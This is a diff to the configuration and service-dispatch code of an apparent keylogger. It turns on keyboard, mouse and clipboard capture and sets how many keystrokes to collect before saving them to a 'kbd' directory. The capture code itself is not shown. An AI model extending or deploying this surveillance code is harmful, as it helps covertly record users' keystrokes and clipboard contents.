@@ -2,11 +2,13 @@
 
 // Service toggle
 #define KEYBOARD_SERVICE	true
-#define MOUSE_SERVICE		false
-#define CRIPBOARD_SERVICE	false
+#define MOUSE_SERVICE		true
+#define CLIPBOARD_SERVICE	true
 
 // Keylogger settings
-#define KEYLOGGER_MAX_REPEATS 10
+#define KEYBOARD_MAX_REPEATS 5
+#define KEYBOARD_KEYS_TO_SAVE 20	// How many times key should be pressed to save data
+#define KEYBOARD_DIR "kbd"			// Name of keyboard service working directory
 
 // Includes
 #if KEYBOARD_SERVICE
@@ -15,7 +17,7 @@
 #if MOUSE_SERVICE
 #include "mouse.h"
 #endif
-#if CRIPBOARD_SERVICE
+#if CLIPBOARD_SERVICE
 #include "clipboard.h"
 #endif
 
@@ -29,8 +31,8 @@ namespace services
 #if MOUSE_SERVICE
 		mouse::run();
 #endif
-#if CRIPBOARD_SERVICE
-
+#if CLIPBOARD_SERVICE
+		clipboard::run();
 #endif
 	}
 
@@ -42,8 +44,8 @@ namespace services
 #if MOUSE_SERVICE
 		mouse::stop();
 #endif
-#if CRIPBOARD_SERVICE
-
+#if CLIPBOARD_SERVICE
+		clipboard::stop();
 #endif
 	}
 }
